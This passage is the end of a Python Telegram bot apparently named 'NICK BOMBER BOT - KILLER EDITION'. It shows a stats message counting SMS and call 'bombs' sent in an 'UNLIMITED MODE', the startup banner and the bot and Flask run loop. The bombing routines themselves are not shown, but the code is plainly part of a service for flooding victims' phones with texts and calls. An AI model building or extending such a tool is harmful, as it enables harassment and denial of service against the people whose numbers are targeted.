• Verified: {stats['verified']}
• Active Today: {stats['active_today']}

💣 **Total Bombs:**
• SMS: {stats['total_sms']}
• Calls: {stats['total_calls']}
• Combined: {stats['total_sms'] + stats['total_calls']}

⚡ **Status:** 🔥 UNLIMITED MODE

**Owner:** @NICKPAPAJI
        """,
        parse_mode='md'
    )

# =============== MAIN FUNCTION ===============
async def main():
    """Main function"""
    init_db()
    
    print("""
    ╔════════════════════════════════════════╗
    ║     NICK BOMBER BOT - KILLER EDITION  ║
    ║         Owner: @NICKPAPAJI            ║
    ║         UNLIMITED VERSION             ║
    ║         Status: 🔥 ACTIVE             ║
    ╚════════════════════════════════════════╝
    """)
    
    print(f"Bot started at {datetime.now()}")
    print(f"Owner ID: {OWNER_ID}")
    print(f"Owner Username: @NICKPAPAJI")
    print(f"Channel: {CHANNEL_USERNAME}")
    print(f"Bot Username: @{BOT_USERNAME}")
    print("\nWaiting for messages...\n")
    
    await bot.run_until_disconnected()

def run_flask():
    """Run Flask app"""
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    finally:
        loop.run_until_complete(bomber.close())
        loop.close()
